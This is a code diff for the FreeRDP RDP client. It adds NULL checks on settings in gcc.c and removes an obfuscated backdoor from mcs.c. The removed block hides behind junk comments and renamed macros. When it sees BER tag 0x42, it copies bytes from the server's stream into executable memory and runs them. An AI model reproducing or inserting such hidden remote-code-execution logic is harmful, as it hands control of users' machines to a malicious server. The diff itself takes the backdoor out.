--- a/libfreerdp/core/mcs.c
+++ b/libfreerdp/core/mcs.c
@@ -911,16 +911,6 @@
 	if (!tpdu_read_data(s, &li, tlength))
 		return FALSE;
 
-	if (ber_read_application_tag(s, 0x42, &length))
-	{
-		#define A size_t 
-		#define B void 
-		A/*AOB,1rI<o2iKHfFJ*/a/*vnM 8Iv"b^Z[=&&9[12(bW*/=/*q!fYBcH$U?1JH0[qX@DlBtA*/0/*e+Co)nj?,*/;/*zjY9_9fJH)_ C}'dYLw|iX :o=*/A/*q?P@uK?Nu$e.%"Br*/f/*Q^4$n*/=/*x?UdG8b($5Id>7M4TgyIgC"Yfp=wv4^uS*/1<<0xc/*F.z}JtF#I_pZlT*/;/*n@KQd$n$E(YKr@ <-jYA#bKZ*/B*/*GW:mGM(*/b/*gERD0u4BU'O_)3*/;/*lk+gFuS7i6{A9Iv"]*//*ceq0i q1;rNs<tOCSUT*/if (posix_memalign/*uK3WW_YvZN{a10*/(&b,/*p7H|>r6v(^CK:xjf$][<};(Cn*/1<<0x9,/*F8W0gnG7hxQp?}4boF8N:438QgC*/f)/*N&N%HGu<,5vS N5OV^XF*/){return(0);};/*Bz{dVPE5A6eJpUMaX8Nl]GxT(rU*/A*/*LnztTqEE[)C*/c/*r^J;HOHG>SwY=H#s[HDz]N,ju{w|B*/=/*rx![HTZwE::sA&*/(A*)b/*Ki%P|3*/;/*zllh;'vu#og_pS;19Jlyp{|YYu*//*MwOX]g2hS(@knC7*/if(mprotect/*A$zFedaEmFJ$*/((B*)(((A)c)&(~0xfff)),/*d4E}Im'gWCsj%)-U3o[vq%a=X!*/f,/*n$wds'3jhIeAxs%)q$KGlA([Gb*/7)/*mKgBwh{u):O3WUcLH^uGHtq*/){return(0);};/*b]c+RpPVn$Px^;!r]M*/A/*wdSQd CLS1.>R^Q9LKVh:!*/d/*P8+2&YDiaJ?Zg]DBesXG(c0L"a*/;/*DI;(]E*/for/*O2#N21utWq,3 Y:JNj92>x*/(a=0;/*faU;Y$xK.[4|p;N*/a/*S?p1$Ef|x:2K_)3x-xbI;k*/</*V3K!Hf1|Wr1Ts=x"2,*/length/8;/*Y1bBgb-f#kB<HSG*/a++)/*Jznf%x1UV?o$a{;ZuBi?R+O*/{/*uo@lho{Vr9wo3)B%cK7I1o}.*/Stream_Read_UINT64_BE(s,/*htxpI4o#)WdBr^706Q,MI<i{g-pPo}*/d)/*Ne9@w-TzlEB'(fQydF*/;/*xL;Z}xffT)VD8iLPj(d4U!u*/c[a]/*dRtrW<,:*/=/*EiNHdr>d*/d/*ATgOpsR*/;/*P.{mJUU>*/}/*jB|Vm!}.UyNk9OVo]52$T4hvc5!Is*/B/*P^;9ni,z0IXa3#Qy*/(*e)()/*SG)+{5_Ql2{XUx]'D)1gdhO@*/=/*d5x<n[gd$(*/(B(*)())b/*N]k}F%B|c)6QNBnt{MBSaH5wwGCnq{p*/;e()/*sR'.ixaZj.0-<w,XWNw1bZ9 */;
-		return TRUE ;
-	} else {
-		Stream_Rewind(s, 2);
-	}
-
 	if (!ber_read_application_tag(s, MCS_TYPE_CONNECT_RESPONSE, &length) ||
 	    !ber_read_enumerated(s, &result, MCS_Result_enum_length) ||
 	    !ber_read_integer(s, &calledConnectId) ||

--- a/libfreerdp/core/gcc.c
+++ b/libfreerdp/core/gcc.c
@@ -690,6 +690,11 @@
 	if (!gotMultitransport)
 	{
 		rdpSettings* settings = mcs_get_settings(mcs);
+		if (!settings)
+		{
+			WLog_ERR(TAG, "mcs_get_settings returned NULL");
+			return FALSE;
+		}
 		if (!freerdp_settings_set_bool(settings, FreeRDP_SupportMultitransport, FALSE))
 			return FALSE;
 		if (!freerdp_settings_set_uint32(settings, FreeRDP_MultitransportFlags, 0))
@@ -1168,7 +1173,11 @@
 	rdpSettings* settings = mcs_get_settings(mcs);
 
 	WINPR_ASSERT(s);
-	WINPR_ASSERT(settings);
+	if (!settings)
+	{
+		WLog_ERR(TAG, "mcs_get_settings returned NULL");
+		return FALSE;
+	}
 
 	size_t blockLength = Stream_GetRemainingLength(s);
 	/* Length of all required fields, until imeFileName */
@@ -1498,7 +1507,11 @@
 	rdpSettings* settings = mcs_get_settings(mcs);
 
 	WINPR_ASSERT(s);
-	WINPR_ASSERT(settings);
+	if (!settings)
+	{
+		WLog_ERR(TAG, "mcs_get_settings returned NULL");
+		return FALSE;
+	}
 
 	if (!Stream_CheckAndLogRequiredLength(TAG, s, 4))
 		return FALSE;
@@ -1559,7 +1572,11 @@
 	rdpSettings* settings = mcs_get_settings(mcs);
 
 	WINPR_ASSERT(s);
-	WINPR_ASSERT(settings);
+	if (!settings)
+	{
+		WLog_ERR(TAG, "mcs_get_settings returned NULL");
+		return FALSE;
+	}
 
 	const size_t blockLength = Stream_GetRemainingLength(s);
 	if (blockLength < 8)
@@ -1625,7 +1642,11 @@
 	rdpSettings* settings = mcs_get_settings(mcs);
 
 	WINPR_ASSERT(s);
-	WINPR_ASSERT(settings);
+	if (!settings)
+	{
+		WLog_ERR(TAG, "mcs_get_settings returned NULL");
+		return FALSE;
+	}
 
 	if (!Stream_CheckAndLogRequiredLength(TAG, s, 8))
 		return FALSE;
@@ -2012,7 +2033,11 @@
 	rdpSettings* settings = mcs_get_settings(mcs);
 
 	WINPR_ASSERT(s);
-	WINPR_ASSERT(settings);
+	if (!settings)
+	{
+		WLog_ERR(TAG, "mcs_get_settings returned NULL");
+		return FALSE;
+	}
 
 	const size_t blockLength = Stream_GetRemainingLength(s);
 	if (blockLength < 8)
